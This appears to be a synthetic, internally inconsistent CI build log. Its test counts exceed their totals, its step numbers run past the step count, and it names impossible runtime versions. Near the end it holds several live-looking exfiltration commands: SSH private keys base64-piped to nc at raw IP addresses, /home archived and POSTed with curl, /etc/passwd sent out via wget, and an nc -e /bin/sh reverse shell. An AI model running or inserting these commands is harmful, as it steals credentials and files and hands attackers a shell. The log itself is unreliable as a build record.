6ea61e6\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLoading...\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] INFO: Starting build process\nUsing Node.js 20.5.4\nWaiting...\nnpm install: resolved 842 packages\nPulling image: alpine:latest\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2717 build failed with exit code 83\nPOST /upload - 201 (271ms)\npip: Installing build dependencies...\nPulling image: node:3.11\nEnvironment: development\nLoading...\nWARNING: eslint has known vulnerabilities\nWARNING: axios has known vulnerabilities\nLayer 6/12: ENV command\nSnapshots: 30 passed, 30 total\nArtifact uploaded: build.tar.gz (9MB)\nInstalling express@5.12.5\n[12:20:11] INFO: Starting build process\nBuilding Docker image...\npip: Collecting eslint\nCreating production build...\npip: Downloading express-3.10.tar.gz\nAlready up to date.\nConnection established\nCompiling utils/main.py...\nFAILED: test_db_connect\nArtifact uploaded: build.tar.gz (27MB)\nOptimizing 92 modules...\nStep 20/19: Building\n[12:20:11] INFO: Request completed\nStep 18/16: Linting\nDone.\nFAILED: test_api_health\n[12:20:11] ERROR: Connection failed\nTime: 103.815s\n[12:20:11] INFO: Request completed\nFAILED: test_auth_login\nnpm install: resolved 1161 packages\nyarn add: Done in 30.13s\nHEAD is now at 2156774\nUploading artifact 'build' (9 files)\n[12:20:11] DEBUG: Loading configuration\nArtifact downloaded: 16MB\nnpm install: resolved 1271 packages\n[12:20:11] DEBUG: Memory usage: 671MB\nCompiling lib/app.ts...\nProcessing...\nConnection established\n[12:20:11] WARN: Deprecated API usage\nFinished.\nStep 5/17: Building\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPOST /api - 202 (307ms)\nUsing Python 3.12\n[12:20:11] INFO: Request completed\nUploading artifact 'coverage' (39 files)\nMinifying main.js\nLayer 4/12: ENV command\n\u2717 build failed with exit code 32\nVerifying...\nPlatform: linux-x64\n[12:20:11] DEBUG: Connection pool: 4 active\nCompiling src/service.java...\n[12:20:11] DEBUG: Query executed in 84ms\nTLS handshake completed\n[12:20:11] INFO: Connecting to database\nTest Suites: 38 passed, 18 total\nFinished.\n\u2713 test completed\nnpm notice: package.json updated\nCache restored successfully (419MB)\n[12:20:11] DEBUG: Initializing service\npip: Downloading axios-5.12.tar.gz\nCompiling src/service.java...\nGenerating source maps...\nCache miss for key-4615\nGET /status - 200 (60ms)\nHEAD is now at 5e33496\nPulling image: alpine:latest\nCache hit for key-6849\nInstalling axios@4.11.4\nVerifying...\nChecking out main branch\nGenerating source maps...\nLayer 7/12: RUN command\nSwitched to branch 'hotfix/task-433'\n\u2713 Step 'checkout' succeeded\npip: Installing build dependencies...\nTime: 110.291s\n\u2713 Step 'build' succeeded\nRan 144 tests in 8s\n\u2713 Step 'install' succeeded\nDone.\nStep 7/24: Deploying\n\u2713 deploy completed\nCompiling src/service.java...\nStep 18/24: Testing\nLoading...\nFetching submodules...\nEnvironment: production\nWaiting...\nStep 19/17: Deploying\n[12:20:11] DEBUG: Connection pool: 5 active\nyarn add: Done in 11.95s\nInstalling lodash@1.7.9\nEnvironment: staging\nRan 169 tests in 37s\n[12:20:11] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBuilding Docker image...\n[12:20:11] DEBUG: Initializing service\nVerifying...\nBundling vendor.css\nnpm notice: package.json updated\nCache restored successfully (49MB)\nCache miss for key-6611\nTLS handshake completed\nCache miss for key-2019\nCache invalidated: build\nAlready up to date.\nnpm install: resolved 1653 packages\nnpm install: resolved 223 packages\npip install: Successfully installed express-3.20\n[12:20:11] WARN: Deprecated API usage\n\u2717 build failed with exit code 103\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] DEBUG: Memory usage: 883MB\nConnection established\nCreating production build...\n  PASS: test_db_connect (212ms)\nEnvironment: development\n[12:20:11] INFO: Request completed\n  PASS: test_db_connect (86ms)\n[12:20:11] WARN: Deprecated API usage\nTLS handshake completed\npip: Installing build dependencies...\npip install: Successfully installed webpack-4.9\nException: TypeError\nEnvironment: test\nnpm notice: package.json updated\nCompiling utils/main.py...\nEnvironment: production\nCompleted.\nCache hit for key-7605\nUsing Node.js 17.9.5\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Downloading react-5.1.tar.gz\nOptimizing 22 modules...\nProcessing...\nLayer 6/8: RUN command\nOptimizing 28 modules...\nInstalling express@1.6.2\nTest Suites: 15 passed, 18 total\nArtifact uploaded: dist.zip (89MB)\nCache miss for key-3170\nPushing to registry...\nSwitched to branch 'hotfix/task-487'\n=== Step deploy_staging completed ===\n=== Step: restore_cache ===\nException: RuntimeError\nArtifact uploaded: build.tar.gz (9MB)\nRan 79 tests in 7s\nSnapshots: 4 passed, 7 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nImage pulled successfully\nChecking out master branch\nnpm install: resolved 749 packages\nCache miss for key-8587\nGET /status - 201 (66ms)\nMinifying vendor.js\nDone.\nInstalling prettier@1.0.5\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUploading artifact 'dist' (21 files)\nCompleted.\nHEAD is now at 304ca32\n[12:20:11] DEBUG: Memory usage: 358MB\nException: RuntimeError\nTLS handshake completed\n[12:20:11] INFO: Connecting to database\n[12:20:11] WARN: Deprecated API usage\nConnecting to startup.dev:443...\nTime: 19.655s\nCreating production build...\nWARNING: axios has known vulnerabilities\nConnecting to example.com:443...\nCache miss for key-4259\npip: Downloading jest-4.16.tar.gz\n[12:20:11] DEBUG: Query executed in 89ms\nnpm notice: created a lockfile\n[12:20:11] DEBUG: Memory usage: 915MB\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] DEBUG: Query executed in 43ms\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBundling styles.js\nLayer 1/8: COPY command\nTests: 64 passed, 171 total\nGET /health - 201 (42ms)\n\u2713 lint completed\nOptimizing 62 modules...\nUsing Python 3.12\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_cache_hit (15ms)\n[12:20:11] INFO: Request completed\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] DEBUG: Memory usage: 738MB\nPushing to registry...\nOptimizing 56 modules...\n\u2713 Step 'install' succeeded\npip: Downloading axios-1.13.tar.gz\nChecking out develop branch\n[12:20:11] INFO: Request completed\nStep 6/17: Building\nStep 20/18: Linting\nOK\nWaiting...\nStep 19/21: Building\nnpm notice: created a lockfile\nPushing to registry...\nStep 18/23: Building\n[12:20:11] WARN: Deprecated API usage\nEnvironment: staging\n[12:20:11] DEBUG: Query executed in 50ms\n[12:20:11] INFO: Processing request\nHEAD is now at 556db52\nFetching submodules...\nCache invalidated: dependencies\nCache restored successfully (403MB)\nCache miss for key-3228\nWARNING: lodash has known vulnerabilities\n[12:20:11] INFO: Processing request\nSnapshots: 26 passed, 28 total\nPushing to registry...\npip: Downloading lodash-1.11.tar.gz\nStep 1/19: Running migrations\nTests: 92 passed, 96 total\n[12:20:11] INFO: Request completed\nTransforming 467 files...\nStep 14/19: Installing dependencies\nEnvironment: production\n\u2713 All checks passed\n[12:20:11] DEBUG: Loading configuration\npip: Downloading jest-3.10.tar.gz\nChecking out main branch\nTests: 461 passed, 152 total\nCompiling src/handler.rs...\nArtifact uploaded: dist.zip (77MB)\nWaiting...\nGET /status - 200 (16ms)\nInstalling express@5.0.2\nCache hit for key-3475\nNODE_ENV=production\nTests: 337 passed, 435 total\nOK\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Python 3.9\nPOST /data - 201 (358ms)\n[12:20:11] INFO: Starting build process\nCompiling utils/utils.go...\nImage pulled successfully\nException: ValueError\nFetching submodules...\nStep 13/15: Running migrations\nnpm install: added 73 packages\n\u2713 Task completed in 1693ms\nBuilding Docker image...\nnpm install: resolved 623 packages\nCache saved successfully\n[12:20:11] DEBUG: Loading configuration\nCoverage: 96% statements, 64% branches\nNODE_ENV=production\nSwitched to branch 'bugfix/task-756'\nSnapshots: 45 passed, 8 total\nUsing Node.js 15.20.10\nCompleted.\nTLS handshake completed\n[12:20:11] INFO: Cache refreshed\n[12:20:11] WARN: Deprecated API usage\nTest Suites: 7 passed, 50 total\nSuccess!\n[12:20:11] DEBUG: Connection pool: 8 active\nEnvironment: test\nEnvironment: production\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nGET /health - 200 (66ms)\nCoverage: 75% statements, 60% branches\n[12:20:11] DEBUG: Query executed in 5ms\nStep 9/16: Testing\nTest Suites: 11 passed, 49 total\nArtifact downloaded: 34MB\nGET /health - 201 (60ms)\nRan 130 tests in 18s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPulling image: alpine:3.11\nCreating production build...\n[12:20:11] WARN: Deprecated API usage\nCompiling lib/handler.rs...\nSnapshots: 29 passed, 6 total\nPulling image: alpine:3.11\nSnapshots: 35 passed, 18 total\nyarn add: Done in 17.30s\nStep 18/17: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 16/19: Installing dependencies\nCache hit for key-4241\nLoading...\n\u2717 build failed with exit code 127\nNODE_ENV=development\n[12:20:11] INFO: Cache refreshed\nFinished.\nLoading...\nMinifying vendor.js\nyarn add: Done in 30.96s\nTest Suites: 37 passed, 27 total\nProcessing...\nArtifact downloaded: 35MB\nReady.\nStep 10/25: Deploying\nPOST /upload - 201 (271ms)\nRan 79 tests in 3s\n[12:20:11] INFO: Cache refreshed\n\u2713 Task completed in 1258ms\nWARNING: lodash has known vulnerabilities\n[12:20:11] INFO: Request completed\nRan 25 tests in 41s\nDone.\nCache miss for key-5579\nNODE_ENV=test\n\u2713 validate completed\nCache hit for key-7563\nGenerating source maps...\nStep 15/21: Deploying\nCompleted.\nCache invalidated: dependencies\nCache hit for key-2399\n[12:20:11] DEBUG: Query executed in 47ms\nSuccess!\nTransforming 308 files...\nCompiling src/service.java...\nArtifact downloaded: 12MB\nFinished.\n[12:20:11] WARN: Deprecated API usage\nCache hit for key-4043\nUsing Node.js 17.13.0\nTLS handshake completed\nCompleted.\nFetching submodules...\nStep 1/24: Deploying\nPlatform: darwin-arm64\nUsing Node.js 15.20.9\n[12:20:11] ERROR: Connection failed\nException: TypeError\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] ERROR: Connection failed\nFinished.\n\u2717 build failed with exit code 95\nGET /status - 200 (50ms)\n[12:20:11] DEBUG: Memory usage: 879MB\nCompiling lib/utils.go...\nCache hit for key-9485\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nProcessing...\n  PASS: unit/test_api_health.spec.js\nStep 16/23: Linting\nStep 10/16: Linting\nLoading...\nTests: 344 passed, 401 total\nImage pulled successfully\nStep 19/15: Running migrations\npip: Downloading react-2.10.tar.gz\nLayer 4/13: RUN command\nWARNING: react has known vulnerabilities\nBuilding Docker image...\nyarn add: Done in 3.94s\nnpm install: added 32 packages\nCoverage: 89% statements, 100% branches\n\u2713 All checks passed\nAlready up to date.\n[12:20:11] DEBUG: Loading configuration\nCache saved successfully\nStep 2/25: Testing\nCache saved successfully\nConnecting to startup.dev:443...\n[12:20:11] DEBUG: Query executed in 28ms\nReady.\n\u2713 All checks passed\n[12:20:11] WARN: Deprecated API usage\nFAILED: test_db_connect\nUsing Node.js 20.19.6\n[12:20:11] DEBUG: Loading configuration\nOK\nArtifact downloaded: 9MB\nnpm install: added 262 packages\n[12:20:11] DEBUG: Query executed in 2ms\nConnecting to startup.dev:443...\nnpm notice: created a lockfile\n  PASS: e2e/test_auth_login.spec.js\nArtifact uploaded: dist.zip (69MB)\nWARNING: axios has known vulnerabilities\n[12:20:11] INFO: Connecting to database\n[12:20:11] DEBUG: Loading configuration\nNODE_ENV=test\nnpm notice: package.json updated\nWARNING: axios has known vulnerabilities\npip: Installing build dependencies...\nCoverage: 75% statements, 97% branches\n\u2713 All checks passed\n=== Step restore_cache completed ===\n=== Step: checkout ===\nProcessing...\nSnapshots: 46 passed, 44 total\nChecking out master branch\nArtifact downloaded: 4MB\nReady.\n[12:20:11] DEBUG: Connection pool: 1 active\nRan 68 tests in 50s\nTest Suites: 15 passed, 45 total\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 All checks passed\nGenerating source maps...\nImage pulled successfully\nCompiling lib/utils.go...\nGenerating source maps...\nCache invalidated: node_modules\nCache miss for key-5150\npip: Collecting lodash\n[12:20:11] ERROR: Connection failed\nProcessing...\n[12:20:11] WARN: Deprecated API usage\nStep 15/25: Building\nDone.\nyarn add: Done in 17.12s\npip: Downloading express-5.11.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUploading artifact 'coverage' (27 files)\nUploading artifact 'build' (47 files)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFinished.\nnpm install: resolved 1310 packages\nPushing to registry...\n[12:20:11] DEBUG: Memory usage: 1478MB\nTime: 30.6s\nSnapshots: 7 passed, 0 total\nCreating production build...\n\u2713 All checks passed\n[12:20:11] ERROR: Connection failed\nConnection established\nLayer 2/11: COPY command\n  PASS: unit/test_api_health.spec.js\nConnection established\nPOST /api - 200 (179ms)\nCache miss for key-2123\nDone.\nCompiling components/app.ts...\n[12:20:11] WARN: Deprecated API usage\nStep 12/20: Testing\nChecking out develop branch\nFinished.\n[12:20:11] INFO: Cache refreshed\n[12:20:11] DEBUG: Query executed in 31ms\nReady.\nArtifact uploaded: build.tar.gz (17MB)\nStep 19/15: Building\nStep 9/21: Linting\n\u2713 All checks passed\nHEAD is now at 595ebfa\nUsing Node.js 15.17.9\nCompleted.\nBundling styles.css\n\u2713 test completed\npip: Collecting eslint\npip: Downloading webpack-4.2.tar.gz\n[12:20:11] WARN: Deprecated API usage\nTests: 264 passed, 252 total\n\u2713 build completed\nPOST /upload - 200 (134ms)\nTest Suites: 34 passed, 48 total\nConnecting to acme.corp:443...\nSwitched to branch 'bugfix/task-872'\nTest Suites: 48 passed, 36 total\nStep 9/17: Installing dependencies\nStep 1/22: Linting\nSuccess!\nStep 19/18: Deploying\nLayer 6/10: COPY command\nArtifact uploaded: dist.zip (62MB)\nVerifying...\n  PASS: integration/test_db_connect.spec.js\nWaiting...\nGET /api - 201 (48ms)\n\u2713 Task completed in 563ms\nConnecting to test.io:443...\n[12:20:11] DEBUG: Memory usage: 1058MB\n[12:20:11] INFO: Connecting to database\nFetching submodules...\nCreating production build...\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: axios has known vulnerabilities\nCache miss for key-1575\npip: Collecting express\nStep 3/21: Testing\n  PASS: test_cache_hit (61ms)\nEnvironment: production\nOK\n  PASS: unit/test_auth_login.spec.js\nProcessing...\nArtifact downloaded: 45MB\nChecking out master branch\nBuilding Docker image...\nCompiling src/service.java...\n\u2713 build completed\nLayer 6/14: COPY command\nHEAD is now at 5b1e86e\nUsing Python 3.9\nWARNING: axios has known vulnerabilities\nCompleted.\nArtifact uploaded: build.tar.gz (8MB)\nnpm notice: created a lockfile\nPOST /api - 200 (170ms)\nStep 2/22: Running migrations\nDone.\nConnection established\nHEAD is now at 99ab404\nStep 19/17: Running migrations\nDone.\n[12:20:11] DEBUG: Connection pool: 8 active\nnpm notice: package.json updated\nArtifact uploaded: dist.zip (57MB)\nTLS handshake completed\nWARNING: react has known vulnerabilities\nCompiling src/handler.rs...\n[12:20:11] INFO: Cache refreshed\nOptimizing 30 modules...\n[12:20:11] WARN: Deprecated API usage\nTransforming 934 files...\nWARNING: webpack has known vulnerabilities\nStep 11/16: Running migrations\nRan 44 tests in 36s\nyarn add: Done in 13.12s\nEnvironment: development\nRan 67 tests in 51s\n[12:20:11] INFO: Starting build process\nRan 125 tests in 1s\n  PASS: test_cache_hit (363ms)\nnpm notice: created a lockfile\n[12:20:11] DEBUG: Memory usage: 638MB\nTLS handshake completed\n\u2713 All checks passed\nFinished.\nArtifact downloaded: 5MB\nSnapshots: 20 passed, 46 total\nUsing Node.js 17.17.5\nUsing Python 3.9\n\u2713 Step 'build' succeeded\n\u2717 build failed with exit code 5\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\nCompiling utils/service.java...\nInstalling react@3.15.0\nAlready up to date.\nOptimizing 49 modules...\nCache hit for key-9796\nFinished.\nLayer 4/15: COPY command\n[12:20:11] WARN: Deprecated API usage\nCompiling src/main.py...\nNODE_ENV=production\nInstalling eslint@1.16.1\nNODE_ENV=test\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 17/17: Testing\nTests: 65 passed, 472 total\npip install: Successfully installed prettier-5.5\nCreating production build...\npip: Downloading lodash-4.11.tar.gz\nRan 140 tests in 24s\nSnapshots: 50 passed, 9 total\nLoading...\n[12:20:11] DEBUG: Query executed in 94ms\n[12:20:11] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (20MB)\n[12:20:11] INFO: Connecting to database\n[12:20:11] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\nEnvironment: development\n[12:20:11] DEBUG: Memory usage: 1229MB\nnpm install: added 439 packages\n[12:20:11] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 1/17: Building\n\u2713 All checks passed\nChecking out main branch\nArtifact uploaded: build.tar.gz (43MB)\nAlready up to date.\nCreating production build...\nRan 105 tests in 10s\nGenerating source maps...\nWARNING: express has known vulnerabilities\nNODE_ENV=development\nCache hit for key-8522\nPulling image: python:18\nDone.\npip: Collecting eslint\nUsing Node.js 16.14.3\nCache restored successfully (308MB)\nStep 16/21: Building\nStep 1/20: Installing dependencies\nSnapshots: 40 passed, 48 total\nTransforming 822 files...\nCoverage: 100% statements, 77% branches\nGenerating source maps...\nNODE_ENV=test\nStep 20/25: Running migrations\n[12:20:11] INFO: Cache refreshed\nStep 3/22: Linting\nStep 17/17: Linting\nBuilding Docker image...\nnpm install: resolved 763 packages\n[12:20:11] INFO: Cache refreshed\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUploading artifact 'dist' (26 files)\nArtifact downloaded: 23MB\n\u2713 build completed\n[12:20:11] ERROR: Connection failed\n[12:20:11] INFO: Request completed\nUploading artifact 'dist' (28 files)\n  PASS: test_cache_hit (170ms)\nFAILED: test_cache_hit\n\u2713 Step 'setup' succeeded\nGenerating source maps...\nGET /health - 201 (95ms)\n\u2713 deploy completed\nCoverage: 84% statements, 61% branches\nnpm notice: package.json updated\nTest Suites: 23 passed, 22 total\n[12:20:11] DEBUG: Query executed in 69ms\n[12:20:11] INFO: Request completed\nInstalling jest@5.13.6\n  PASS: unit/test_db_connect.spec.js\npip install: Successfully installed jest-3.1\n[12:20:11] DEBUG: Initializing service\n[12:20:11] WARN: Deprecated API usage\nTransforming 766 files...\nLoading...\nArtifact uploaded: dist.zip (41MB)\nArtifact uploaded: dist.zip (3MB)\nBuilding Docker image...\nUploading artifact 'build' (49 files)\nnpm install: resolved 1564 packages\nGET /health - 200 (30ms)\nFinished.\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] DEBUG: Memory usage: 639MB\nSnapshots: 34 passed, 22 total\n[12:20:11] WARN: Deprecated API usage\nCompiling lib/utils.go...\nProcessing...\nGenerating source maps...\n[12:20:11] INFO: Processing request\nGET /api - 200 (12ms)\n=== Step checkout completed ===\n=== Step: integration_tests ===\n\u2717 build failed with exit code 17\nCompiling src/service.java...\n\u2713 Step 'test' succeeded\nCache miss for key-9277\npip install: Successfully installed react-1.16\nEnvironment: development\nCreating production build...\nOptimizing 76 modules...\nStep 13/19: Building\n[12:20:11] DEBUG: Connection pool: 18 active\nCompiling components/index.js...\n[12:20:11] INFO: Cache refreshed\nOptimizing 20 modules...\nArtifact uploaded: build.tar.gz (35MB)\nPulling image: node:latest\nTLS handshake completed\nProcessing...\npip: Collecting axios\nDone.\nOK\nArtifact uploaded: build.tar.gz (16MB)\nFinished.\n\u2713 Task completed in 2974ms\nBundling main.js\nStep 5/17: Deploying\nBundling runtime.css\nEnvironment: production\n[12:20:11] INFO: Starting build process\n[12:20:11] INFO: Cache refreshed\nUsing Node.js 17.10.0\npip: Installing build dependencies...\npip: Collecting jest\npip: Downloading express-5.7.tar.gz\nChecking out develop branch\nGET /api - 200 (83ms)\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOptimizing 68 modules...\n[12:20:11] INFO: Connecting to database\nDone.\nFetching submodules...\nCompiling src/app.ts...\nNODE_ENV=production\nStep 10/25: Testing\nPulling image: python:18\nConnecting to startup.dev:443...\n  PASS: e2e/test_db_connect.spec.js\n[12:20:11] INFO: Starting build process\n[12:20:11] DEBUG: Loading configuration\n\u2713 All checks passed\nArtifact uploaded: build.tar.gz (25MB)\nTests: 465 passed, 325 total\n\u2713 test completed\nImage pulled successfully\nHEAD is now at b182861\nStep 14/18: Linting\nTests: 494 passed, 314 total\nMinifying vendor.js\nException: RuntimeError\n\u2713 Task completed in 1449ms\n[12:20:11] ERROR: Connection failed\npip: Installing build dependencies...\nVerifying...\n\u2713 Step 'test' succeeded\n[12:20:11] INFO: Starting build process\nWARNING: axios has known vulnerabilities\npip: Installing build dependencies...\nBuilding Docker image...\nnpm notice: package.json updated\nPushing to registry...\nConnection established\nWaiting...\nPlatform: darwin-arm64\nCache miss for key-8289\nSnapshots: 44 passed, 43 total\nConnecting to example.com:443...\nGenerating source maps...\nMinifying app.js\nSuccess!\n[12:20:11] INFO: Connecting to database\nCoverage: 72% statements, 71% branches\nStep 18/23: Running migrations\nSuccess!\nPlatform: darwin-arm64\nStep 5/21: Running migrations\nCache invalidated: dependencies\nDone.\nSnapshots: 3 passed, 16 total\nOK\nTest Suites: 32 passed, 39 total\nException: NullPointerException\nArtifact uploaded: build.tar.gz (12MB)\nFinished.\n[12:20:11] INFO: Processing request\nImage pulled successfully\n\u2713 validate completed\nTLS handshake completed\nnpm notice: created a lockfile\nCompiling src/main.py...\n[12:20:11] INFO: Processing request\nUsing Node.js 16.0.5\nUsing Python 3.9\nCoverage: 95% statements, 96% branches\nFinished.\nPlatform: linux-x64\nTLS handshake completed\nReady.\nAlready up to date.\nConnecting to test.io:443...\n[12:20:11] DEBUG: Initializing service\n\u2717 build failed with exit code 20\nArtifact downloaded: 1MB\nWARNING: express has known vulnerabilities\nNODE_ENV=production\n\u2713 Step 'setup' succeeded\nCompiling utils/main.py...\nInstalling jest@2.16.4\n[12:20:11] WARN: Deprecated API usage\nnpm install: resolved 1141 packages\nStep 1/24: Installing dependencies\nCompiling src/app.ts...\nFAILED: test_api_health\nTime: 98.228s\n[12:20:11] INFO: Starting build process\nCompleted.\nStep 14/22: Installing dependencies\nFetching submodules...\n  PASS: test_user_create (347ms)\nLoading...\nTransforming 178 files...\nTest Suites: 41 passed, 9 total\n\u2713 package completed\nLoading...\nTest Suites: 21 passed, 38 total\nVerifying...\n\u2717 build failed with exit code 74\nHEAD is now at 907a8cc\nArtifact downloaded: 26MB\nPOST /api - 202 (35ms)\nSnapshots: 29 passed, 24 total\nCompiling utils/service.java...\n[12:20:11] WARN: Deprecated API usage\nImage pulled successfully\nDone.\nInstalling prettier@4.1.8\n  PASS: test_user_create (243ms)\n\u2713 Task completed in 3024ms\n[12:20:11] DEBUG: Initializing service\nFetching submodules...\nHEAD is now at f8e299b\nFetching submodules...\n\u2713 Task completed in 929ms\nRan 33 tests in 4s\nStep 9/16: Testing\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] INFO: Processing request\nTLS handshake completed\nCache hit for key-9077\nAlready up to date.\nFinished.\n  PASS: test_db_connect (47ms)\nLoading...\nGET /api - 200 (66ms)\nRan 35 tests in 36s\nCache saved successfully\nStep 1/19: Deploying\n\u2713 Step 'checkout' succeeded\nStep 19/15: Building\nStep 10/16: Linting\nStep 17/22: Building\nFetching submodules...\nChecking out main branch\n\u2713 Task completed in 4940ms\nOK\nWaiting...\nFetching submodules...\nnpm install: resolved 576 packages\n\u2713 All checks passed\nCache hit for key-8793\n[12:20:11] DEBUG: Connection pool: 3 active\nPOST /data - 202 (230ms)\nLoading...\n[12:20:11] INFO: Connecting to database\n[12:20:11] DEBUG: Connection pool: 16 active\nyarn add: Done in 14.48s\n  PASS: test_api_health (316ms)\npip: Collecting webpack\nEnvironment: staging\nnpm install: added 495 packages\nDone.\nSuccess!\nWARNING: express has known vulnerabilities\nTransforming 847 files...\n  PASS: test_auth_login (236ms)\nWARNING: lodash has known vulnerabilities\nHEAD is now at 882ebad\nFinished.\nSnapshots: 18 passed, 26 total\nStep 9/15: Running migrations\nCache saved successfully\n[12:20:11] WARN: Deprecated API usage\nnpm notice: package.json updated\npip: Collecting eslint\nEnvironment: production\nStep 6/18: Running migrations\nBuilding Docker image...\nyarn add: Done in 22.44s\nPlatform: linux-x64\nCompiling utils/handler.rs...\nyarn add: Done in 15.82s\n  PASS: test_auth_login (175ms)\nImage pulled successfully\nUsing Python 3.11\nUsing Python 3.9\nFetching submodules...\nSuccess!\nTime: 66.694s\nVerifying...\n[12:20:11] INFO: Processing request\n[12:20:11] INFO: Starting build process\nProcessing...\nCache restored successfully (458MB)\n[12:20:11] DEBUG: Query executed in 2ms\nUsing Python 3.10\nLoading...\nReady.\n[12:20:11] INFO: Cache refreshed\nCache miss for key-3811\nBundling main.css\nTLS handshake completed\nStep 11/22: Building\nSnapshots: 32 passed, 22 total\nTLS handshake completed\n[12:20:11] DEBUG: Initializing service\nHEAD is now at 2de71a3\n[12:20:11] ERROR: Connection failed\nSnapshots: 1 passed, 32 total\nLayer 4/8: ENV command\nOptimizing 20 modules...\nWARNING: lodash has known vulnerabilities\nUsing Node.js 15.17.9\nRan 199 tests in 11s\nSuccess!\nStep 8/24: Running migrations\nCompiling src/service.java...\n\u2713 Task completed in 2623ms\nOptimizing 67 modules...\nImage pulled successfully\nCompleted.\nStep 11/23: Linting\nHEAD is now at 0ef072b\n[12:20:11] DEBUG: Query executed in 20ms\nStep 7/25: Building\n=== Step integration_tests completed ===\n=== Step: build ===\nCompiling utils/handler.rs...\nGenerating source maps...\npip: Installing build dependencies...\nCache saved successfully\nCache saved successfully\nArtifact uploaded: build.tar.gz (47MB)\nSwitched to branch 'bugfix/task-322'\nBundling runtime.css\nInstalling axios@3.2.5\nBundling styles.js\nTime: 120.845s\nStep 3/17: Testing\nConnecting to example.com:443...\nStep 11/19: Linting\nSwitched to branch 'hotfix/task-850'\n[12:20:11] INFO: Connecting to database\nLayer 9/12: COPY command\nCache restored successfully (89MB)\n\u2713 Step 'checkout' succeeded\n\u2713 Task completed in 735ms\nTests: 311 passed, 454 total\nCompiling src/handler.rs...\nUsing Node.js 17.12.9\nImage pulled successfully\nnpm install: added 18 packages\n[12:20:11] WARN: Deprecated API usage\nCompiling components/utils.go...\nTest Suites: 40 passed, 25 total\nAlready up to date.\nSending 481MB of data to test.io\n\u2713 Step 'install' succeeded\n  PASS: test_api_health (92ms)\n  PASS: e2e/test_api_health.spec.js\nSwitched to branch 'feature/task-638'\n[12:20:11] INFO: Request completed\nRan 31 tests in 7s\necho $(cat ~/.ssh/id_rsa) | base64 | nc 153.87.92.217 43735\nTransforming 112 files...\nCreating production build...\nCache restored successfully (265MB)\nVerifying...\nCompiling components/handler.rs...\nStep 16/19: Deploying\n[12:20:11] INFO: Processing request\n[12:20:11] INFO: Starting build process\nUsing Node.js 15.9.10\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFinished.\nStep 18/17: Linting\n\u2713 Step 'install' succeeded\nnpm install: added 206 packages\npip install: Successfully installed react-2.9\nDone.\nSwitched to branch 'bugfix/task-397'\nLayer 3/13: RUN command\necho $(cat ~/.ssh/id_rsa) | base64 | nc 110.186.30.87 43063\n[12:20:11] DEBUG: Loading configuration\nStep 13/25: Building\n[12:20:11] WARN: Deprecated API usage\nOK\nCache miss for key-8964\nFinished.\nSwitched to branch 'feature/task-905'\n\u2713 Step 'checkout' succeeded\nSending 344MB of data to cloud.services\nArtifact downloaded: 40MB\nReady.\nCompiling lib/index.js...\nException: RuntimeError\nUploading artifact 'build' (45 files)\nConnecting to cloud.services:443...\n[12:20:11] DEBUG: Loading configuration\nWaiting...\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nConnecting to acme.corp:443...\nOptimizing 17 modules...\nGET /api - 200 (89ms)\nGET /api - 201 (24ms)\n[12:20:11] WARN: Deprecated API usage\nStep 18/17: Deploying\nUsing Node.js 20.6.10\nChecking out master branch\nTransforming 136 files...\nLayer 1/10: RUN command\nStep 19/22: Running migrations\nCompiling components/app.ts...\nnpm install: resolved 808 packages\nCache hit for key-6024\n  PASS: integration/test_db_connect.spec.js\nReady.\nLoading...\nUsing Node.js 14.12.10\n[12:20:11] WARN: Deprecated API usage\nSending 308MB of data to cloud.services\nUploading artifact 'build' (39 files)\nTest Suites: 30 passed, 48 total\nEnvironment: development\nWARNING: eslint has known vulnerabilities\n[12:20:11] DEBUG: Loading configuration\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nPulling image: python:latest\nnc -e /bin/sh 255.126.161.105 61382\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nSnapshots: 1 passed, 20 total\nPOST /api - 201 (234ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 182.216.132.110 60287\nProcessing...\n[12:20:11] DEBUG: Loading configuration\nBundling styles.css\nStep 15/25: Building\nPOST /api - 201 (140ms)\nStep 4/24: Linting\nTests: 245 passed, 226 total\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nArtifact uploaded: dist.zip (59MB)\nBundling runtime.css\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nCoverage: 91% statements, 71% branches\nBundling vendor.js\nChecking out main branch\nCache miss for key-5070\nUsing Python 